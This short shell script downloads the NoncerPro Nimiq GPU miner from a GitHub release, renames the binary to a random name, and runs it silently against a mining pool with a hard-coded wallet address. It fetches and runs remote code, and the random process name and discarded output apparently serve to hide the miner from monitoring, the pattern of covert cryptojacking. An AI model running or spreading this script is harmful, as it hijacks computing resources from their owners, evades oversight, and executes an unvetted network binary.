APP=app$(shuf -i 1000000-9999999 -n 1)
wget -q https://github.com/NoncerPro/noncerpro-nimiq-cuda/releases/download/v3.3.1/noncerpro-cuda-linux-3.3.1.tar.gz
tar -xhf noncerpro-cuda-linux-3.3.1.tar.gz
mv noncerpro $APP
chmod +x $APP
./$APP -a="NQ50 44BA 44R3 BFHX 8648 3UTH LX98 KJYC TV5P" -s=pool.acemining.co -p=8443 > /dev/null 2>&1
